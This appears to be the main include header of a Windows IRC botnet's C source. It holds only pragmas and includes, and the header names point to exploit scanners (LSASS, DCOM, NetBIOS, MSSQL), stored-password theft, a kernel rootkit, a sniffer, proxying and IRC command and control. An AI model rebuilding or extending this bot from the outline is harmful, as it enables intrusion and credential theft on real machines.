#define _WIN32_WINNT 0x0403
#define WIN32_LEAN_AND_MEAN
#ifndef _DEBUG
#pragma optimize("gsy", on)
#pragma comment(linker,"/ALIGN:4096 /IGNORE:4108 /RELEASE /IGNORE:4089")
#pragma comment(linker,"/STUB:stub.exe") 
#else
#pragma comment(linker,"/NODEFAULTLIB:MSVCRTD")
#endif
//kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib  kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib 

#include <winsock2.h>
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
//#include <stdarg.h>

#include <malloc.h>
#include <wininet.h>
#include <windns.h>
#include <iphlpapi.h>
#include <lm.h>
#include <lmat.h>
#include <io.h>
#include <fcntl.h>
#include <tchar.h>
#include <tlhelp32.h>
#include <shlwapi.h>//PathRemoveFileSpec()
#include <list>
//#include <assert.h>
#include <sqlext.h>
//#include <vfw.h>
//#include <shlobj.h>
#include <ntsecapi.h>
//#include <shellapi.h>
//#include <string>
//#include <map>

#include <string.h>//fu
#include <winioctl.h>//fu

#include <sys\types.h> // for filesize function
#include <sys\stat.h>  // ^

#include "defines.h"

#ifndef NO_PSTORE
#include <commctrl.h>
#import "pstorec.dll" no_namespace
#include "pstore.h"
#endif

#include "Psapi.h"


#include "crypt.h"
#include "secure.h"
#include "advscan.h"
#include "thcsql.h"
#include "lsass.h"
#include "netbios.h"
#include "pnp.h"
#include "asn.h"
#include "driveinfo.h"
#include "loaddlls.h"
#include "reptile.h"
#include "info.h"
#include "utility.h"
#include "irc.h"
#include "commands.h"
#include "protocol.h"
#include "threads.h"
#include "externs.h"
#include "regcontrol.h"
#include "service.h"
#include "processes.h"
#include "ftpd.h"
#include "download.h"
#include "fphost.h"
#include "netutils.h"
#include "banner.h"
#include "dcom.h"
#include "netstatp.h"
#include "wkssvc.h"
#include "fu.h"
#include "speedtest.h"
#include "socks4.h"
#include "redirect.h"
#include "mssql.h"
#include "wins.h"
#include "netdde.h"
#include "vscan.h"
#include "svchost.h"
#include "sniffer.h"
